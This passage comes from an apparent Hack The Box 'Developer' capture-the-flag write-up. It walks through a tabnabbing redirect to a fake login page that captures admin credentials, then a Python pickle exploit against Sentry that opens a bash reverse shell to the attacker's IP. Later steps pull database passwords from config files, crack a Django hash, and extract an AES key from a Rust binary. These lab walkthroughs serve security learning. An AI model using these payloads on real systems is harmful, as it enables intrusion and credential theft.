</span></span></code></pre></div><p>Then I created <code>writeup.html</code> which will perform the tabnapping.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="display:flex"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex"><span>  &lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">if</span> (window.<span style="color:#a6e22e">opener</span>)
</span></span><span style="display:flex"><span>      window.<span style="color:#a6e22e">opener</span>.<span style="color:#a6e22e">parent</span>.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#34;//10.10.14.81:8080/login.html&#34;</span>);
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">if</span> (window.<span style="color:#a6e22e">parent</span> <span style="color:#f92672">!=</span> window)
</span></span><span style="display:flex"><span>      window.<span style="color:#a6e22e">parent</span>.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#34;//10.10.14.81:8080/login.html&#34;</span>);
</span></span><span style="display:flex"><span>  &lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>Then we can upload the writeup as this file in our local server. We will
see traffic from the server pointing to the fake login page (it worked).</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>❯ python -m http.server <span style="color:#ae81ff">8080</span>
</span></span><span style="display:flex"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8080</span> <span style="color:#f92672">(</span>http://0.0.0.0:8080/<span style="color:#f92672">)</span> ...
</span></span><span style="display:flex"><span>10.10.11.103 - - <span style="color:#f92672">[</span>01/Dec/2021 18:51:33<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /writeup.html HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
</span></span><span style="display:flex"><span>10.10.11.103 - - <span style="color:#f92672">[</span>01/Dec/2021 18:51:33<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /login.html HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
</span></span><span style="display:flex"><span>10.10.11.103 - - <span style="color:#f92672">[</span>01/Dec/2021 18:51:34<span style="color:#f92672">]</span> code 404, message File not found
</span></span><span style="display:flex"><span>10.10.11.103 - - <span style="color:#f92672">[</span>01/Dec/2021 18:51:34<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /static/css/bootstrap.min.css HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> -
</span></span></code></pre></div><p>And now you can see in the other terminal the credentials
<code>admin:SuperSecurePassword@HTB2021</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>❯ python -m http.server <span style="color:#ae81ff">8081</span>
</span></span><span style="display:flex"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8081</span> <span style="color:#f92672">(</span>http://0.0.0.0:8081/<span style="color:#f92672">)</span> ...
</span></span><span style="display:flex"><span>10.10.11.103 - - <span style="color:#f92672">[</span>01/Dec/2021 18:51:35<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /?csrfmiddlewaretoken=DNASuXuPkU07d5eNEABgOZsAzDPk3tS3BYJrWmTahQdvAUIYHsStaSpBQvSVTGMs&amp;login=admin&amp;password=SuperSecurePassword%40HTB2021 HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
</span></span></code></pre></div><p>We can login at <code>/admin</code> with those credentials, and we will be able to
see the administration page.</p><p>In the Sites page, there is a list of domains. There is one subdomain:
<code>developer-sentry.developer.htb</code>. Let’s visit it and see what it is
about.</p><p>Oh no, there is a new login page, but the credentials we got are not
working. It is running <code>Sentry 8.0.0</code>, which doesn’t seem vulnerable
unless we are logged in.</p><p>I tried to check which users existed with the recover the password
option, but neither <code>admin</code> or the ones registered on the other page
work.</p><p>We know the name of the admin: <em>Jacob Taylor</em>. Maybe trying all
combinations of name or surname and domains <code>developer.htb</code>? After some
time, I could simply login with <code>jacob@developer.htb</code> and the same
password.</p><p>I found an exploit for version 8.2.0, so we could try it:</p><p></p><div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://www.exploit-db.com/exploits/50318"><div><div class="bookmark-title">OffSec’s Exploit Database Archive</div><div class="bookmark-description">Sentry 8.2.0 - Remote Code Execution (RCE) (Authenticated).. webapps exploit for Python platform</div><div class="bookmark-link"><div>https://www.exploit-db.com/exploits/50318</div></div></div><div class="bookmark-image"><img src="https://www.exploit-db.com/images/spider-orange.png" alt="" loading="lazy"/></div></a></div>It seems like the <code>auditlogentry</code> is running, so we might be able to
exploit it:
<a href="http://developer-sentry.developer.htb/admin/sentry/auditlogentry/">http://developer-sentry.developer.htb/admin/sentry/auditlogentry/</a><p></p><p>The exploit doesn’t work with <code>python3</code>, I’m going to try to use the one
in the pdf linked:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>from cPickle import dumps
</span></span><span style="display:flex"><span>import subprocess
</span></span><span style="display:flex"><span>from base64 import b64encode
</span></span><span style="display:flex"><span>from zlib import compress
</span></span><span style="display:flex"><span>from shlex import split
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>class PickleExploit<span style="color:#f92672">(</span>object<span style="color:#f92672">)</span>:
</span></span><span style="display:flex"><span>        def __init__<span style="color:#f92672">(</span>self, command_line<span style="color:#f92672">)</span>:
</span></span><span style="display:flex"><span>                self.args <span style="color:#f92672">=</span> split<span style="color:#f92672">(</span>command_line<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>        def __reduce__<span style="color:#f92672">(</span>self<span style="color:#f92672">)</span>:
</span></span><span style="display:flex"><span>                <span style="color:#66d9ef">return</span> <span style="color:#f92672">(</span>subprocess.Popen, <span style="color:#f92672">(</span>self.args,<span style="color:#f92672">))</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>print b64encode<span style="color:#f92672">(</span>compress<span style="color:#f92672">(</span>dumps<span style="color:#f92672">(</span>PickleExploit<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.81/6666 0&gt;&amp;1&#34;&#39;</span><span style="color:#f92672">))))</span>
</span></span></code></pre></div><p>If we update a log entry with the output of the script, we will receive
a connection in <code>netcat</code>. And we will be into <strong>www-data</strong>!</p><h1 id="getting-the-user-flag">Getting the user flag<a hidden="" class="anchor" aria-hidden="true" href="#getting-the-user-flag">#</a></h1><p>We have to get to user <code>mark</code> or <code>karl</code>.</p><p>If we look for the configuration of the page:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>www-data@developer:~/developer_ctf/developer_ctf$ cat settings.py
</span></span></code></pre></div><p>We can see some credentials for <code>postgresql</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">DATABASES</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex"><span>    <span style="color:#e6db74">&#39;default&#39;</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#39;ENGINE&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;django.db.backends.postgresql&#39;</span>,
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#39;NAME&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;platform&#39;</span>,
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#39;USER&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;ctf_admin&#39;</span>,
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#39;PASSWORD&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;CTFOG2021&#39;</span>,
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#39;HOST&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;localhost&#39;</span>,
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#39;PORT&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>,
</span></span><span style="display:flex"><span>    }
</span></span><span style="display:flex"><span>}
</span></span></code></pre></div><p>We can connect to the database with them.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>psql -h localhost -d platform -U ctf_admin -W
</span></span><span style="display:flex"><span>Password <span style="color:#66d9ef">for</span> user ctf_admin: CTFOG2021
</span></span><span style="display:flex"><span>platform<span style="color:#f92672">=</span>&gt;<span style="color:#ae81ff">\d</span>t
</span></span></code></pre></div><p>But this gives us access to the CTF page, not the <code>sentry</code> one which
contained a user called <code>karl</code>. Also, I couldn’t login with any
registered user, so I assume they are not privileged ones.</p><p>So I will try to enter the <code>sentry</code> database.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
</span></span><span style="display:flex"><span>-----------+----------+----------+-------------+-------------+-----------------------
</span></span><span style="display:flex"><span> platform  | postgres | UTF8     | en_GB.UTF-8 | en_GB.UTF-8 |
</span></span><span style="display:flex"><span> postgres  | postgres | UTF8     | en_GB.UTF-8 | en_GB.UTF-8 |
</span></span><span style="display:flex"><span> sentry    | postgres | UTF8     | en_GB.UTF-8 | en_GB.UTF-8 |
</span></span><span style="display:flex"><span> template0 | postgres | UTF8     | en_GB.UTF-8 | en_GB.UTF-8 | <span style="color:#f92672">=</span>c/postgres          +
</span></span><span style="display:flex"><span>           |          |          |             |             | postgres<span style="color:#f92672">=</span>CTc/postgres
</span></span><span style="display:flex"><span> template1 | postgres | UTF8     | en_GB.UTF-8 | en_GB.UTF-8 | <span style="color:#f92672">=</span>c/postgres          +
</span></span><span style="display:flex"><span>           |          |          |             |             | postgres<span style="color:#f92672">=</span>CTc/postgres
</span></span></code></pre></div><p>We can change database like this:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>platform<span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">\c</span> sentry
</span></span><span style="display:flex"><span><span style="color:#ae81ff">\c</span> sentry
</span></span><span style="display:flex"><span>Password: CTFOG2021
</span></span><span style="display:flex"><span>sentry<span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">\d</span>t
</span></span></code></pre></div><p>We don’t have reading permissions on the tables. We may find other login
credentials for the <code>sentry</code> page. If we look for the word <code>sentry</code> in
all the machine, we find the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>/etc/sentry
</span></span><span style="display:flex"><span>/etc/sentry/sentry.conf.py
</span></span></code></pre></div><p>In the last one, we find the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">DATABASES</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex"><span>    <span style="color:#e6db74">&#39;default&#39;</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#39;ENGINE&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;sentry.db.postgres&#39;</span>,
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#39;NAME&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;sentry&#39;</span>,
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#39;USER&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;sentry&#39;</span>,
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#39;PASSWORD&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;SentryPassword2021&#39;</span>,
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#39;HOST&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;localhost&#39;</span>,
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#39;PORT&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>,
</span></span><span style="display:flex"><span>    }
</span></span><span style="display:flex"><span>}
</span></span></code></pre></div><p>Quite secure password, we can try to login with it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>psql -h localhost -d sentry -U sentry -W
</span></span><span style="display:flex"><span>Password <span style="color:#66d9ef">for</span> user sentry: SentryPassword2021
</span></span></code></pre></div><p>And we can get the hash of <code>karl</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">sentry</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">select</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">auth_user</span>;
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#a6e22e">pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr</span><span style="color:#f92672">+</span><span style="color:#a6e22e">mgRb8ZL8othIs32aGmqahx1rGI</span><span style="color:#f92672">=</span>
</span></span></code></pre></div><p>We can decrypt it using <code>hashcat</code>. It will automatically detect it as a
django hash. The decrypted password is <code>insaneclownposse</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr</span><span style="color:#f92672">+</span><span style="color:#a6e22e">mgRb8ZL8othIs32aGmqahx1rGI</span><span style="color:#f92672">=:</span><span style="color:#a6e22e">insaneclownposse</span>
</span></span></code></pre></div><p>Then you can simply swith user to karl:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>su karl
</span></span></code></pre></div><p>And we will be inside of user! You can now take the <strong>user flag</strong>.</p><p>You can also login via the ssh service, so we get a better shell.</p><h1 id="privilege-escalation">Privilege escalation<a hidden="" class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h1><p>We can check for privileged calls:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>sudo -l
</span></span></code></pre></div><p>And we will see an executable that can be ran as root.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">Matching</span> <span style="color:#a6e22e">Defaults</span> <span style="color:#a6e22e">entries</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">karl</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">developer</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex"><span>    <span style="color:#a6e22e">env_reset</span>, <span style="color:#a6e22e">mail_badpass</span>, <span style="color:#a6e22e">secure_path</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#a6e22e">User</span> <span style="color:#a6e22e">karl</span> <span style="color:#a6e22e">may</span> <span style="color:#a6e22e">run</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">following</span> <span style="color:#a6e22e">commands</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">developer</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex"><span>    (<span style="color:#a6e22e">ALL</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">ALL</span>) <span style="color:#f92672">/</span><span style="color:#a6e22e">root</span><span style="color:#f92672">/</span>.<span style="color:#a6e22e">auth</span><span style="color:#f92672">/</span><span style="color:#a6e22e">authenticator</span>
</span></span></code></pre></div><p>If we run it we get prompt for a pasword:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">Welcome</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">TheCyberGeek</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#66d9ef">super</span> <span style="color:#a6e22e">secure</span> <span style="color:#a6e22e">login</span> <span style="color:#a6e22e">portal</span><span style="color:#f92672">!</span>
</span></span><span style="display:flex"><span><span style="color:#a6e22e">Enter</span> <span style="color:#a6e22e">your</span> <span style="color:#a6e22e">password</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">access</span> <span style="color:#a6e22e">the</span> <span style="color:#66d9ef">super</span> <span style="color:#a6e22e">user</span><span style="color:#f92672">:</span>
</span></span></code></pre></div><p>This may be like a reverse engineer challenge.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>authenticator: ELF 64-bit LSB shared object, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>dec8c0adbc231a7465e5df021c1f9e6695fe6a2f, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, with debug_info, not stripped
</span></span></code></pre></div><p>Looking at the <code>strings</code> command output, it looks like it is a rust
executable. I will download the file with <code>scp</code> for further inspection.</p><p><code>die</code> shows it is not compressed, so we may be able to just inspect it
as it is.</p><p>We can see a symbol of a rust function: <code>crypto::aes::ctr</code>. If you look
at the documentation, this are its parameters:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-rust" data-lang="rust"><span style="display:flex"><span><span style="color:#66d9ef">pub</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">ctr</span>(
</span></span><span style="display:flex"><span>    key_size: <span style="color:#a6e22e">KeySize</span>,
</span></span><span style="display:flex"><span>    key: <span style="color:#66d9ef">&amp;</span>[<span style="color:#66d9ef">u8</span>],
</span></span><span style="display:flex"><span>    iv: <span style="color:#66d9ef">&amp;</span>[<span style="color:#66d9ef">u8</span>]
</span></span><span style="display:flex"><span>) -&gt; Box<span style="color:#f92672">&lt;</span>SynchronousStreamCipher <span style="color:#f92672">+</span> &#39;static<span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>In this piece of code, we can identify these two vars as the key and iv
parameters. If you keep executing the code (and looking at the source),
you can see that it is using a length of 128.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span>.<span style="color:#a6e22e">text</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000055</span><span style="color:#a6e22e">D554199916</span> <span style="color:#a6e22e">lea</span>     <span style="color:#a6e22e">rsi</span>, [<span style="color:#a6e22e">rsp</span><span style="color:#f92672">+</span><span style="color:#ae81ff">278</span><span style="color:#a6e22e">h</span><span style="color:#f92672">+</span><span style="color:#a6e22e">var_118</span>]         ; <span style="color:#a6e22e">key</span>
</span></span><span style="display:flex"><span>.<span style="color:#a6e22e">text</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000055</span><span style="color:#a6e22e">D55419991E</span> <span style="color:#a6e22e">lea</span>     <span style="color:#a6e22e">rcx</span>, [<span style="color:#a6e22e">rsp</span><span style="color:#f92672">+</span><span style="color:#ae81ff">278</span><span style="color:#a6e22e">h</span><span style="color:#f92672">+</span><span style="color:#a6e22e">var_108</span>]         ; <span style="color:#a6e22e">iv</span>
</span></span><span style="display:flex"><span>.<span style="color:#a6e22e">text</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000055</span><span style="color:#a6e22e">D554199926</span> <span style="color:#a6e22e">mov</span>     <span style="color:#a6e22e">edx</span>, <span style="color:#ae81ff">10</span><span style="color:#a6e22e">h</span>
</span></span><span style="display:flex"><span>.<span style="color:#a6e22e">text</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000055</span><span style="color:#a6e22e">D55419992B</span> <span style="color:#a6e22e">mov</span>     <span style="color:#a6e22e">r8d</span>, <span style="color:#ae81ff">10</span><span style="color:#a6e22e">h</span>
</span></span><span style="display:flex"><span>.<span style="color:#a6e22e">text</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000055</span><span style="color:#a6e22e">D554199931</span> <span style="color:#a6e22e">mov</span>     <span style="color:#a6e22e">edi</span>, <span style="color:#ae81ff">0</span>                          ; <span style="color:#a6e22e">ctr</span>(<span style="color:#a6e22e">keySize</span>, <span style="color:#a6e22e">key</span>, <span style="color:#a6e22e">iv</span>)
</span></span><span style="display:flex"><span>.<span style="color:#a6e22e">text</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000055</span><span style="color:#a6e22e">D554199936</span> <span style="color:#a6e22e">call</span>    <span style="color:#a6e22e">cs</span><span style="color:#f92672">:</span><span style="color:#a6e22e">_ZN6crypto3aes3ctr17h2e946f13694abc7dE_ptr</span> ; <span style="color:#a6e22e">crypto</span><span style="color:#f92672">::</span><span style="color:#a6e22e">aes</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ctr</span><span style="color:#f92672">::</span><span style="color:#a6e22e">h2e946f13694abc7d</span>
</span></span></code></pre></div><p>This is the key:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B2390</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">A3h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B2391</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0E8</span><span style="color:#a6e22e">h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B2392</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">32</span><span style="color:#a6e22e">h</span> ; <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B2393</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">34</span><span style="color:#a6e22e">h</span> ; <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B2394</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">5</span><span style="color:#a6e22e">Ch</span> ; <span style="color:#f92672">\</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B2395</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">79</span><span style="color:#a6e22e">h</span> ; <span style="color:#a6e22e">y</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B2396</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">91</span><span style="color:#a6e22e">h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B2397</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">61</span><span style="color:#a6e22e">h</span> ; <span style="color:#a6e22e">a</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B2398</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">9</span><span style="color:#a6e22e">Eh</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B2399</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">20</span><span style="color:#a6e22e">h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B239A</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">D4h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B239B</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">3</span><span style="color:#a6e22e">Dh</span> ; <span style="color:#f92672">=</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B239C</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">BEh</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B239D</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">F4h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B239E</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">F5h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B239F</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">D5h</span>
</span></span></code></pre></div><p>The formated key is the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">A3</span> <span style="color:#a6e22e">E8</span> <span style="color:#ae81ff">32</span> <span style="color:#ae81ff">34</span> <span style="color:#ae81ff">5</span><span style="color:#a6e22e">C</span> <span style="color:#ae81ff">79</span> <span style="color:#ae81ff">91</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">9</span><span style="color:#a6e22e">E</span> <span style="color:#ae81ff">20</span> <span style="color:#a6e22e">D4</span> <span style="color:#ae81ff">3</span><span style="color:#a6e22e">D</span> <span style="color:#a6e22e">BE</span> <span style="color:#a6e22e">F4</span> <span style="color:#a6e22e">F5</span> <span style="color:#a6e22e">D5</span>
</span></span></code></pre></div><p>And this is the IV:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B23A0</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">76</span><span style="color:#a6e22e">h</span> ; <span style="color:#a6e22e">v</span>
